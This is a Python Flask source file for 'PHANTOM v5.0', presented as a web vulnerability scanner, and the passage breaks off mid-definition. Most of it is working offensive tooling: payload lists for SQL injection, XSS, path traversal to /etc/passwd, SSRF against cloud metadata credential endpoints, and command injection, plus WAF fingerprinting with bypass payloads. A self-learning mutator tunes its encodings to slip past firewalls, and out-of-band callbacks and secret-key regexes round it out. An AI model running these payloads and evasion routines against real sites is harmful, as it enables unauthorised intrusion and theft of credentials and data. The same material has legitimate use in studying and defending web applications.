#!/usr/bin/env python3
"""
PHANTOM v5.0 - ULTIMATE Web Vulnerability Scanner
Flask Web App | Render.com | All 20+ Modules
"""
import base64,hashlib,hmac,json,math,os,random,re,socket,ssl,threading,time,uuid,warnings
from collections import deque
from concurrent.futures import ThreadPoolExecutor,as_completed
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin,urlparse,urlencode,parse_qsl,quote
import requests
from bs4 import BeautifulSoup
from flask import Flask,request,jsonify

warnings.filterwarnings("ignore")
try: requests.packages.urllib3.disable_warnings()
except: pass
try:    import dns.resolver,dns.query,dns.zone; DNS_OK=True
except: DNS_OK=False
try:    import whois as wh; WHOIS_OK=True
except: WHOIS_OK=False
try:    from playwright.sync_api import sync_playwright; PW_OK=True
except: PW_OK=False

PORT=int(os.environ.get("PORT",5000))
THREADS=int(os.environ.get("PHANTOM_THREADS",24)); TIMEOUT=int(os.environ.get("PHANTOM_TIMEOUT",7))
DEPTH=int(os.environ.get("PHANTOM_DEPTH",3)); MAXURLS=150
DELAY=float(os.environ.get("PHANTOM_DELAY",0.0)); VER="5.0"
FAST=os.environ.get("PHANTOM_FAST","1")!="0"          # speed-first mode (default on)
SCAN_BUDGET=int(os.environ.get("PHANTOM_BUDGET","300"))# hard time budget (seconds)
MAX_PARAM=6 if FAST else 12                            # params tested per URL
MAX_VULN_URLS=40 if FAST else 90                       # representative URLs after dedup
# Out-of-Band collector base = the scanner's OWN public URL (no external API needed).
# On Render, RENDER_EXTERNAL_URL is provided automatically.
OOB_BASE=(os.environ.get("OOB_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "").rstrip("/")
OOB_HITS={}; OOB_LOCK=threading.Lock()
app=Flask(__name__); scans={}
UAS=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"]

# ══ CVSS v3.1 ═══════════════════════════════════════════════════════════════
class CVSSv31:
    AV={"N":0.85,"A":0.62,"L":0.55,"P":0.2}; AC={"L":0.77,"H":0.44}
    PRU={"N":0.85,"L":0.62,"H":0.27}; PRC={"N":0.85,"L":0.68,"H":0.50}
    UI={"N":0.85,"R":0.62}; CIA={"N":0.0,"L":0.22,"H":0.56}
    VV={"SQL Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "SQL Injection (Form)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "XXE Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "HTTP Request Smuggling":dict(av="N",ac="H",pr="N",ui="N",s="C",c="H",i="H",a="N"),
        "SSTI":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "LFI":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "LFI Config Read":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="L"),
        "Command Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "SSRF":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "Unauthenticated Redis":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Unauthenticated Elasticsearch":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Unauthenticated MongoDB":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
        "FTP Anonymous Login":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "API Key Exposed":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "DNS Zone Transfer":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Reflected XSS":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "Reflected XSS (Form)":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "CORS Misconfiguration":dict(av="N",ac="L",pr="N",ui="R",s="U",c="H",i="H",a="N"),
        "Open Redirect":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Sensitive File Exposed":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Admin Panel Found":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Clickjacking":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "CSRF Missing Token":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "Insecure Cookie":dict(av="N",ac="H",pr="N",ui="R",s="U",c="L",i="N",a="N"),
        "JWT Issue":dict(av="N",ac="H",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Missing Header (HIGH)":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Missing Header (MEDIUM)":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="N",a="N"),
        "Info Disclosure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Outdated Service CVE":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "Open Port (Dangerous)":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "GraphQL Introspection":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "GraphQL DoS":dict(av="N",ac="L",pr="N",ui="N",s="U",c="N",i="N",a="H"),
        "Web Cache Poisoning":dict(av="N",ac="H",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "HTTP Parameter Pollution":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"),
        "Business Logic Flaw":dict(av="N",ac="L",pr="L",ui="N",s="U",c="L",i="H",a="N"),
        "OAuth Misconfiguration":dict(av="N",ac="L",pr="N",ui="R",s="U",c="H",i="H",a="N"),
        "WordPress Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "WebSocket Vulnerability":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "SSL/TLS Weakness":dict(av="N",ac="H",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Rate Limiting Missing":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="H"),
        "CSP Weakness":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "Subdomain Found":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Stack Trace Leaked":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "IDOR":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
        "Proto Pollution":dict(av="N",ac="L",pr="N",ui="N",s="C",c="L",i="L",a="H"),
        "Drupal Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "Joomla Vulnerability":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
        "Default Credentials":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="H"),
        "NoSQL Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Host Header Injection":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="H",a="N"),
        "CRLF Injection":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="H",a="N"),
        "Subdomain Takeover":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="N"),
        "DOM XSS":dict(av="N",ac="L",pr="N",ui="R",s="C",c="L",i="L",a="N"),
        "Insecure Deserialization":dict(av="N",ac="H",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Dangerous HTTP Method":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="H",a="N"),
        "Cross-Site Tracing (XST)":dict(av="N",ac="H",pr="N",ui="R",s="U",c="L",i="N",a="N"),
        "Directory Listing":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Mixed Content":dict(av="N",ac="H",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Email Spoofing (SPF/DMARC)":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "Open Cloud Storage":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "Log4Shell (JNDI)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Reverse Tabnabbing":dict(av="N",ac="L",pr="N",ui="R",s="U",c="N",i="L",a="N"),
        "Cacheable Sensitive Page":dict(av="N",ac="H",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "WebSocket Vulnerability":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Missing security.txt":dict(av="N",ac="L",pr="N",ui="N",s="U",c="N",i="N",a="N"),
        "XPath Injection":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "LDAP Injection":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="L",a="N"),
        "Expression Language Injection":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Stored XSS":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="N"),
        "User Enumeration":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Unrestricted File Upload":dict(av="N",ac="L",pr="L",ui="N",s="C",c="H",i="H",a="H"),
        "Backup File Exposed":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Source Code Disclosure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Web Cache Deception":dict(av="N",ac="H",pr="N",ui="R",s="C",c="H",i="N",a="N"),
        "Session Fixation":dict(av="N",ac="H",pr="N",ui="R",s="U",c="H",i="L",a="N"),
        "Weak JWT Secret":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="N"),
        "Hidden Parameter":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Forced Browsing":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="H",a="N"),
        "Verbose Error Disclosure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="N",a="N"),
        "Blind SSRF (OOB)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "Out-of-Band RCE":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="H",a="H"),
        "Blind XXE (OOB)":dict(av="N",ac="L",pr="N",ui="N",s="C",c="H",i="L",a="N"),
        "Stateful Logic Flaw":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
        "API Misconfiguration":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "Mass Assignment":dict(av="N",ac="L",pr="L",ui="N",s="U",c="H",i="H",a="N"),
        "Excessive Data Exposure":dict(av="N",ac="L",pr="N",ui="N",s="U",c="H",i="N",a="N"),
        "HTTP Method Override":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="H",a="N"),
        "Vulnerable Code Pattern":dict(av="N",ac="L",pr="N",ui="R",s="U",c="L",i="L",a="N"),
        "Dangerous Binary Pattern":dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"),
    }
    def score(self,vtype):
        vec=self.VV.get(vtype,dict(av="N",ac="L",pr="N",ui="N",s="U",c="L",i="L",a="N"))
        av_v=self.AV[vec["av"]]; ac_v=self.AC[vec["ac"]]
        pr_v=(self.PRC if vec["s"]=="C" else self.PRU)[vec["pr"]]
        ui_v=self.UI[vec["ui"]]
        c_v=self.CIA[vec["c"]]; i_v=self.CIA[vec["i"]]; a_v=self.CIA[vec["a"]]
        isc=1-(1-c_v)*(1-i_v)*(1-a_v)
        if isc<=0: impact=0.0
        elif vec["s"]=="U": impact=6.42*isc
        else: impact=7.52*(isc-0.029)-3.25*((isc-0.02)**15)
        exp=8.22*av_v*ac_v*pr_v*ui_v
        if impact<=0: raw=0.0
        elif vec["s"]=="U": raw=min(impact+exp,10)
        else: raw=min(1.08*(impact+exp),10)
        final=math.ceil(raw*10)/10
        vs=(f"CVSS:3.1/AV:{vec['av']}/AC:{vec['ac']}/PR:{vec['pr']}/"
            f"UI:{vec['ui']}/S:{vec['s']}/C:{vec['c']}/I:{vec['i']}/A:{vec['a']}")
        sev=("NONE" if final==0 else "LOW" if final<4 else
             "MEDIUM" if final<7 else "HIGH" if final<9 else "CRITICAL")
        return round(final,1),vs,sev

CVSS=CVSSv31()

# ══ WAF FINGERPRINTER ════════════════════════════════════════════════════════
class WAFFingerprinter:
    HS={"Cloudflare":[("cf-ray",""),("server","cloudflare"),("cf-cache-status","")],
        "AWS WAF":[("x-amzn-requestid",""),("x-amz-cf-id","")],
        "Akamai":[("x-akamai-request-id",""),("server","akamaighost")],
        "Sucuri":[("x-sucuri-id",""),("x-sucuri-cache","")],
        "Incapsula":[("x-iinfo",""),("x-cdn","incapsula")],
        "ModSecurity":[("x-mod-security",""),("x-modsec-ruleid","")],
        "F5 BIG-IP":[("server","bigip"),("x-wa-info","")],
        "Barracuda":[("x-barracuda-connect","")],
        "FortiWeb":[("x-forwarded-by","fortiweb")],
        "Wordfence":[("x-wordfence-cache","")],
        "Fastly":[("x-fastly-request-id","")],
        "Azure Front Door":[("x-azure-requestid",""),("x-azure-ref","")],
        "Varnish":[("x-varnish",""),("via","varnish")],
        "DDoS-GUARD":[("server","ddos-guard")],
        "PerimeterX":[("x-px-enforce","")]}
    CS={"Cloudflare":["__cfduid","cf_clearance","__cf_bm"],
        "Incapsula":["incap_ses_","visid_incap_"],
        "AWS ELB":["AWSELB","AWSALBCORS"],
        "Akamai":["ak_bmsc","bm_sz","_abck"],
        "F5 BIG-IP":["BIGipServer"],
        "PerimeterX":["_px2","_px3"],
        "DataDome":["datadome"]}
    BS={"Cloudflare":["cloudflare ray id","cf-ray","attention required! | cloudflare"],
        "Sucuri":["access denied - sucuri website firewall"],
        "Incapsula":["incapsula incident id","request unsuccessful"],
        "ModSecurity":["406 not acceptable","this request has been blocked"],
        "Wordfence":["wordfence","generated by wordfence"],
        "Barracuda":["barracuda networks"],
        "SiteLock":["sitelock protection"]}
    BYPASS={"Cloudflare":["<ScRiPt>alert(1)</ScRiPt>","%3Cscript%3Ealert(1)%3C%2Fscript%3E"],
            "ModSecurity":["<script>alert(String.fromCharCode(88,83,83))</script>"],
            "Generic":[quote("' OR 1=1--"),"'+OR+1=1--"]}
    def detect(self,url,job):
        result={"waf":None,"confidence":0,"bypass_hint":"None needed","details":[]}
        try:
            r=requests.get(url+"/?waf_test=<script>alert(1)</script>&id=1 OR 1=1",
                           headers={"User-Agent":UAS[0]},timeout=TIMEOUT,verify=False)
        except: return result
        hlc={k.lower():v.lower() for k,v in r.headers.items()}
        body=r.text.lower(); ck=" ".join(r.cookies.keys()).lower()
        scores={}
        for waf,sigs in self.HS.items():
            for hdr,val in sigs:
                if hdr in hlc and(not val or val in hlc.get(hdr,"")):
                    scores[waf]=scores.get(waf,0)+3
        for waf,cks in self.CS.items():
            for c in cks:
                if c.lower() in ck: scores[waf]=scores.get(waf,0)+2
        for waf,pats in self.BS.items():
            for p in pats:
                if p in body: scores[waf]=scores.get(waf,0)+4
        if r.status_code in(403,406,429,503) and not scores:
            result.update({"waf":"Unknown WAF","confidence":40,
                           "bypass_hint":"Try URL/hex encoding payloads"}); return result
        if scores:
            best=max(scores,key=scores.get)
            hints={"Cloudflare":"Use Unicode normalisation or case mixing",
                   "ModSecurity":"Comment injection /**/ or null byte insertion",
                   "AWS WAF":"HTTP parameter pollution or JSON payloads",
                   "Sucuri":"Slow-rate obfuscated payloads",
                   "Akamai":"Fragmented requests or alternate content-type"}
            result.update({"waf":best,"confidence":min(scores[best]*10,100),
                           "bypass_hint":hints.get(best,"Try URL-encoding or case variation"),
                           "bypass_payloads":self.BYPASS.get(best,self.BYPASS["Generic"])})
            job.log(f"WAF: {best} ({result['confidence']}%) | {result['bypass_hint']}","WARN")
        return result

WAF_ENGINE=WAFFingerprinter()

# ══ SMART FUZZER ═════════════════════════════════════════════════════════════
class SmartFuzzer:
    PTR=[(["id","uid","userid","user_id","pid"],"integer"),
         (["page","limit","offset","skip"],"pagination"),
         (["email","mail"],"email"),
         (["url","link","href","redirect","return","next","goto"],"url"),
         (["file","path","dir","template","doc","lang"],"path"),
         (["search","q","query","keyword","term","s","find"],"search"),
         (["name","username","user","login"],"username"),
         (["cat","category","type","tag","filter","sort","order"],"category"),
         (["json","data","body","payload"],"json"),
         (["callback","cb","jsonp","func"],"callback")]
    SQLI={"integer":["' OR 1=1--","1 OR 1=1","0 OR 1=1","1' UNION SELECT NULL--","999999"],
          "search":["test' OR '1'='1","' UNION SELECT 1,2,3--","' OR 1=1#"],
          "string":["' OR '1'='1","' OR 1=1#","' UNION SELECT NULL,NULL--","admin'--"],
          "username":["admin'--","admin' OR 1=1--","' OR '1'='1"]}
    XSS={"search":['<script>alert(1)</script>','"><script>alert(1)</script>','<svg onload=alert(1)>'],
         "string":['"><script>alert(1)</script>','<img src=x onerror=alert(1)>','{{7*7}}'],
         "username":['admin"><script>alert(1)</script>','<script>alert(1)</script>'],
         "callback":["alert(1)","javascript:alert(1)"],
         "url":["javascript:alert(1)"]}
    BOUNDARY={"integer":["0","-1","2147483647","-2147483648","999999","null","NaN"],
              "pagination":["0","-1","9999","1000000"],
              "string":["","   ","A"*100,"\x00","null","undefined"],
              "search":["*","**","%",".",""]}
    NOSQL=['{"$ne":null}','{"$gt":""}','{"$regex":".*"}','{"$nin":[]}']
    PROTO=["__proto__[polluted]=1","constructor[prototype][polluted]=1"]
    SSTI=["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>","{{config}}","{{request.environ}}"]
    def detect_type(self,name,value):
        nl=name.lower()
        for keys,pt in self.PTR:
            if any(k in nl for k in keys): return pt
        if value.isdigit(): return "integer"
        if re.match(r"^[^@]+@[^@]+\.[^@]+$",value): return "email"
        if value.startswith(("http","//")): return "url"
        return "string"
    def get_sqli(self,pt): return self.SQLI.get(pt,self.SQLI["string"])
    def get_xss(self,pt):  return self.XSS.get(pt,self.XSS["string"])
    def get_boundary(self,pt): return self.BOUNDARY.get(pt,self.BOUNDARY["string"])
    def mutate(self,v):
        if v.isdigit():
            n=int(v); return [str(n+1),str(n-1),"0","-1",str(n+100)]
        return [v+"'",v+'"',v+" OR 1=1",v+"<script>alert(1)</script>",v+"/../../../etc/passwd"]

FUZZER=SmartFuzzer()

# ══ ADAPTIVE PAYLOAD MUTATION (Reinforcement Learning — epsilon-greedy bandit)═
# A real, dependency-free RL agent: each mutation *strategy* is an arm of a
# multi-armed bandit. The agent observes the server's reaction (WAF block vs
# reflection vs error) as a reward, updates each strategy's value estimate with
# an incremental average, and biases future payloads toward strategies that are
# actually getting through. No API, no model file — pure online learning.
class AdaptiveMutator:
    def __init__(self, epsilon=0.2):
        self.eps = epsilon
        self.Q   = {}   # strategy -> estimated value
        self.N   = {}   # strategy -> times tried
        for s in ("identity","case_swap","url_encode","double_url","comment_break",
                  "null_byte","unicode_esc","ws_alt","mixed_keyword"):
            self.Q[s] = 0.0; self.N[s] = 0
        self._lock = threading.Lock()

    def _apply(self, payload, strat):
        try:
            if strat == "identity":     return payload
            if strat == "case_swap":    return "".join(c.upper() if i%2 else c.lower()
                                                        for i,c in enumerate(payload))
            if strat == "url_encode":   return quote(payload, safe="")
            if strat == "double_url":   return quote(quote(payload, safe=""), safe="")
            if strat == "comment_break":return payload.replace(" ", "/**/").replace("script","scr/**/ipt")
            if strat == "null_byte":    return payload + "%00"
            if strat == "unicode_esc":  return payload.replace("<","%u003c").replace(">","%u003e")
            if strat == "ws_alt":       return payload.replace(" ", "\t").replace("=", "%09=%09")
            if strat == "mixed_keyword":return (payload.replace("OR","oR").replace("UNION","UnIoN")
                                                       .replace("SELECT","SeLeCt").replace("alert","aLeRt"))
        except Exception:
            return payload
        return payload

    def select(self):
        import random
        with self._lock:
            if random.random() < self.eps:
                return random.choice(list(self.Q))
            return max(self.Q, key=self.Q.get)

    def reward(self, strat, r):
        with self._lock:
            self.N[strat] += 1
            self.Q[strat] += (r - self.Q[strat]) / self.N[strat]   # incremental mean

    def mutate(self, payload, strat=None):
        strat = strat or self.select()
        return strat, self._apply(payload, strat)

    def ranking(self):
        with self._lock:
            return sorted(((s, round(self.Q[s],3), self.N[s]) for s in self.Q),
                          key=lambda x: -x[1])


# ══ OUT-OF-BAND (OOB) HELPERS ════════════════════════════════════════════════
# The scanner's own public URL acts as the interaction listener. Any blind SSRF/
# RCE/XXE that makes the target call our /oob/<token> endpoint is captured here.
def oob_url(token, ctx):
    base = OOB_BASE or f"http://127.0.0.1:{PORT}"
    return f"{base}/oob/{token}/{ctx}"

def oob_host(token, ctx):
    base = OOB_BASE.split("://")[-1] if OOB_BASE else f"127.0.0.1:{PORT}"
    return f"{base}/oob/{token}/{ctx}"

def oob_hits(token):
    with OOB_LOCK:
        return list(OOB_HITS.get(token, []))

# ══ JS SECRET PATTERNS (45+) ═════════════════════════════════════════════════
JS_SECRETS={
    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
    "Firebase DB":     r"https://[a-z0-9\-]+\.firebaseio\.com",
    "Stripe Live SK":  r"sk_live_[0-9a-zA-Z]{24}",
    "Stripe Test SK":  r"sk_test_[0-9a-zA-Z]{24}",
    "GitHub PAT":      r"ghp_[a-zA-Z0-9]{36}",
    "GitHub Fine PAT": r"github_pat_[A-Za-z0-9_]{82}",
    "GitLab Token":    r"glpat-[0-9a-zA-Z\-_]{20}",
    "NPM Token":       r"npm_[A-Za-z0-9]{36}",
    "Slack Bot":       r"xoxb-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
    "Slack Webhook":   r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+",
    "Discord Token":   r"[MN][A-Za-z0-9_-]{23}\.[\w-]{6}\.[\w-]{27}",
    "Discord Webhook": r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+",
    "Telegram Bot":    r"[0-9]{8,10}:[A-Za-z0-9_-]{35}",
    "Twilio SID":      r"AC[a-z0-9]{32}",
    "SendGrid Key":    r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
    "Mailgun Key":     r"key-[a-z0-9]{32}",
    "Mailchimp Key":   r"[a-f0-9]{32}-us[0-9]{1,2}",
    "OpenAI Key":      r"sk-[a-zA-Z0-9]{48}",
    "HuggingFace":     r"hf_[A-Za-z0-9]{34}",
    "Heroku Key":      r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "Cloudinary":      r"cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9]+",
    "Mapbox Token":    r"pk\.eyJ1Ijoi[A-Za-z0-9_-]+",
    "MongoDB URI":     r'mongodb(\+srv)?://[^\s:]+:[^\s@]+@[^\s]+',
    "PostgreSQL URI":  r'postgres(?:ql)?://[^\s:]+:[^\s@]+@[^\s]+',
    "MySQL URI":       r'mysql://[^\s:]+:[^\s@]+@[^\s]+',
    "Redis URI":       r'redis://:?[^@\s]+@[^\s/]+',
    "RSA Private Key": r"-----BEGIN RSA PRIVATE KEY-----",
    "EC Private Key":  r"-----BEGIN EC PRIVATE KEY-----",
    "OpenSSH Key":     r"-----BEGIN OPENSSH PRIVATE KEY-----",
    "JWT Token":       r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*",
    "Bearer Token":    r"(?i)Bearer\s+([A-Za-z0-9_.+/=-]{20,})",
    "DB Password":     r"(?i)(DB_PASSWORD|DATABASE_PASSWORD|DB_PASS)\s*=\s*\S+",
    "Generic Secret":  r"(?i)(secret|password|api_key|access_token)\s*[=:]\s*[^\s]{10,80}",
    "Credentials URL": r"https?://[A-Za-z0-9_\-]+:[A-Za-z0-9_\-!@#$%^&*()]{4,}@",
    "Internal IP":     r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b",
    "GCP Service Acct":r'"type":\s*"service_account"',
    "Hashicorp Vault": r"hvs\.[A-Za-z0-9_-]{24}",
    "Razorpay Key":    r"rzp_(live|test)_[A-Za-z0-9]{14}",
    "PayPal Secret":   r"(?i)paypal.{0,20}secret.{0,20}[A-Za-z0-9]{16,}",
    "JDBC String":     r"jdbc:[a-z]+://[^\s]+password=[^&\s;]+",
    "AWS Session":     r"AQoD[A-Za-z0-9/+=]{100,}",
    "Stripe Pub Key":  r"pk_live_[0-9a-zA-Z]{24}",
}
SECRET_SEV={"AWS Access Key":"CRITICAL","MongoDB URI":"CRITICAL","OpenAI Key":"CRITICAL",
            "RSA Private Key":"CRITICAL","Stripe Live SK":"CRITICAL","Credentials URL":"CRITICAL",
            "JWT Token":"HIGH","GitHub PAT":"HIGH","SendGrid Key":"HIGH","Slack Bot":"HIGH",
            "Generic Secret":"HIGH","Internal IP":"MEDIUM","DB Password":"CRITICAL"}

# ══ PAYLOADS ══════════════════════════════════════════════════════════════════
SQL_PAYLOADS=[
    "'",'"',"''","\'"," OR 1=1--","' OR '1'='1","' OR 1=1#","' OR 1=1 LIMIT 1--",
    '" OR 1=1--',"admin'--","admin'#","') OR ('1'='1",
    "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--+","1' ORDER BY 2--+","1' ORDER BY 3--+",
    "1 AND 1=1","1 AND 1=2","' AND '1'='1","' AND '1'='2",
    "' AND SLEEP(3)--","1; WAITFOR DELAY '0:0:3'--","'; SELECT pg_sleep(3)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--",
    "%27","1%27 OR 1=1",
]
SQL_ERRORS=[
    r"sql syntax.*mysql",r"warning.*mysql_",r"you have an error in your sql syntax",
    r"check the manual that corresponds to your (mysql|mariadb)",
    r"unclosed quotation mark",r"quoted string not properly terminated",
    r"microsoft ole db provider",r"pg_exec\(",r"pg_query\(",
    r"ora-\d{5}",r"oracle error",r"sqlite_.*error",r"error.*sqlite",
    r"sql server.*driver",r"mssql_query\(",r"syntax error.*in query expression",
    r"data type mismatch in criteria",r"invalid column name",r"unknown column",
    r"right syntax to use near",r"column count doesn",r"supplied argument is not a valid",
]
XSS_PAYLOADS=[
    '<script>alert(1)</script>','"><script>alert(1)</script>',
    "'><script>alert(1)</script>",'<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>','<svg onload=alert(1)>','<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>',
    '{{7*7}}','${7*7}','#{7*7}','" onmouseover="alert(1)',
]
LFI_PAYLOADS=["../../../../etc/passwd","../../../etc/passwd","../../etc/passwd",
    "../../../../etc/passwd%00","....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "../../../../windows/win.ini"]
LFI_INDICATORS=["root:x:","bin:x:","daemon:x:","[extensions]","[fonts]"]
LFI_PARAMS=["file","page","path","include","load","template","view","lang","doc","read","open"]
SSRF_PARAMS=["url","path","host","endpoint","redirect","src","fetch","load","proxy","dest","href","uri"]
SSRF_PAYLOADS=["http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://localhost/","http://127.0.0.1/","file:///etc/passwd"]
CMD_PAYLOADS=["; id","| id","` id`","$(id)","; whoami","| whoami","; sleep 3","| sleep 3"]
CMD_INDICATORS=["uid=","gid=","groups=","root:","daemon:","total ","drwxr"]
REDIRECT_PARAMS=["redirect","url","next","return","returnTo","goto","target","dest","to","forward","callback"]
REDIRECT_PAYLOADS=["//evil-phantom-test.com","https://evil-phantom-test.com","///evil-phantom-test.com"]
SENSITIVE_FILES=[
    "/.env","/.env.local","/.env.backup","/.env.prod","/.env.dev",
    "/.git/config","/.git/HEAD","/.git/COMMIT_EDITMSG",
    "/config.php","/wp-config.php","/configuration.php",
    "/config.yml","/config.yaml","/config.json","/database.yml","/secrets.yml",
    "/.htaccess","/.htpasswd","/web.config",
    "/phpinfo.php","/info.php","/test.php",
    "/backup.sql","/dump.sql","/db.sql","/database.sql",
    "/backup.zip","/backup.tar.gz",
    "/robots.txt","/sitemap.xml","/crossdomain.xml",
    "/xmlrpc.php","/wp-login.php","/composer.json","/package.json",
    "/server-status","/server-info","/.DS_Store",
    "/swagger.json","/openapi.json","/api-docs","/graphql","/graphiql",
    "/.bash_history","/readme.md",
    "/actuator/health","/actuator/env","/actuator/beans","/actuator/mappings",
    "/_ah/admin","/jmx-console","/console","/manager/html",
]
ADMIN_PATHS=["/admin","/admin/","/administrator","/wp-admin","/phpmyadmin","/pma/",
    "/dashboard","/panel","/manage","/backend","/cms","/login","/signin",
    "/user/login","/auth/login","/cpanel","/webmin","/secure"]
SECURITY_HEADERS={
